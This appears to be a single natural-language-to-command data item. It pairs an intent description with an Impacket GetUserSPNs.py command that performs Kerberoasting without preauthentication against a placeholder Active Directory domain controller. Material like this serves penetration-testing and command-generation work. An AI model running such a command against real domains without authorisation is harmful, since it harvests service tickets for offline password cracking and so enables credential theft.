# Natural language intent:
# use GetUserSPNs.py to request Service Principal Names (SPNs) without preauthentication for a list of users specified in the "LIST_USERS" file, targeting the domain controller "dc.domain.local" in the "domain.local" domain, and utilizing the "NO_PREAUTH_USER" as a user with no preauthentication.

GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
